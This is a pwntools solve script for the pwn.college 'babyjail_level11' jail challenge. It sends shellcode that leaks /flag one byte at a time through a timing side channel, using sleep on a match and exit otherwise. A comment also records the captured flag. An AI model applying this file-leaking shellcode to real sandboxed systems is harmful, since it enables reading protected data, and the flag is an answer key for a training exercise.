import pwn
from time import time

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

# the fancy progress bars
iteration_progress = pwn.log.progress("PROGRESS")
flag_progress = pwn.log.progress("FLAG")

challenge_binary = "/challenge/babyjail_level11"
flag = str()

# the flag was pwn.college{wOuj1v3lB9fH2WX_hyn2mb5yI7Q.QXxQjMsYDMwQzW}

# 0x55 is the number of chars in flag
for i in range(1, 55):
    # loop through the ASCII range
    for b in range(33, 126):
        iteration_progress.status(f"Iteration {i}, Byte {b}")

        start = time()

        with pwn.process([challenge_binary, "/flag"], level = "CRITICAL") as target:
            target.send(pwn.asm(f"""
            sub rsp, 0x1000
            { pwn.shellcraft.read(3, "rsp", i) }
            { pwn.shellcraft.read(3, "rsp", 1) }
            xor eax, eax
            mov al, byte ptr [rsp]

            cmp rax, {b}
            jne crash
            jmp sleep

            sleep:
                lea rdi, [rip+time]
                xor esi, esi
                mov rax, SYS_nanosleep
                syscall

            crash:
                mov eax, SYS_exit
                mov edi, 1
                syscall

            time:
                .8byte 1
                .8byte 0
            """
            ))

            target.poll(True)

        end = time()

        if end - start > 1:
            flag += chr(b)
            flag_progress.status( flag )
            break

